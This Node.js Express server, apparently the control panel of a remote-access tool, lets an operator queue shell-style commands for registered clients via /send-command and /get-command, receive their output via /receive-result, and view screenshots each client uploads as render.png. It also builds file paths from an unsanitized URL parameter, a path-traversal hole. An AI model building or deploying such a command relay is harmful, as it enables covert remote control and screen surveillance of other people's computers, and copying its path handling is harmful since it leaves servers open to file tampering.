const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const uploadFolder = path.join(__dirname, 'uploads');
let command = ''; 
let resultado = ''


app.use(express.static('public'));
app.use(express.json()); 


if (!fs.existsSync(uploadFolder)) {
  fs.mkdirSync(uploadFolder);
}


let ipCounter = 1;
const generateIP = () => `192.450.34.${ipCounter++}`;


app.get('/new-ip', (req, res) => {
  const newIP = generateIP();
  const ipFolder = path.join(uploadFolder, newIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder);
  }
  res.send({ ip: newIP });
});


const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const userIP = req.params.ip;
    const ipFolder = path.join(uploadFolder, userIP);
    if (!fs.existsSync(ipFolder)) {
      fs.mkdirSync(ipFolder);
    } else {
      
      const existingFile = path.join(ipFolder, 'render.png');
      if (fs.existsSync(existingFile)) {
        fs.unlinkSync(existingFile);
      }
    }
    cb(null, ipFolder);
  },
  filename: (req, file, cb) => {
    cb(null, 'render.png');
  }
});

const upload = multer({ storage: storage });


app.post('/upload/:ip', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).send('arquivo nao elnviado');
  }
  res.send('arquivo enviado com sucesso');
});


app.get('/render-image/:ip', (req, res) => {
  const userIP = req.params.ip;
  const ipFolder = path.join(uploadFolder, userIP);
  const filePath = path.join(ipFolder, 'render.png');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('imagem nao elncontrada');
  }
});


app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));


app.get('/render-html/:ip', (req, res) => {
  const userIP = req.params.ip;
  res.render('render', { ip: userIP });
});


app.get('/select-ip', (req, res) => {
  fs.readdir(uploadFolder, (err, folders) => {
    if (err) {
      return res.status(500).send('ao ler IP');
    }
    res.render('select-ip', { ips: folders });
  });
});


app.get('/view-images/:ip', (req, res) => {
  const userIP = req.params.ip;
  const ipFolder = path.join(uploadFolder, userIP);
  const filePath = path.join(ipFolder, 'render.png');
  if (fs.existsSync(filePath)) {
    res.render('view-images', { ip: userIP, images: ['render.png'] });
  } else {
    res.status(404).send('IP nao encontrado.');
  }
});


app.post('/send-command', (req, res) => {
  const { cmd } = req.body;
  if (!cmd) {
    return res.status(400).send('comando nao foi passado');
  }
  command = cmd; 
  res.send('comando recebido.');
});


app.get('/get-command', (req, res) => {
  const cmd = command;
  command = ''; 
  res.send(cmd);
});


app.post('/receive-result', (req, res) => {
  const { result } = req.body;
  resultado = result
  console.log('resultado recebido', result);
  
  res.send('resultado recebido');
});
app.get('/result-executed',(req, res)=>{

    res.send(resultado)
    resultado = ""

})


const port = 3000;
app.listen(port, () => {
  console.log(`servidor http://localhost:${port}/`);
});
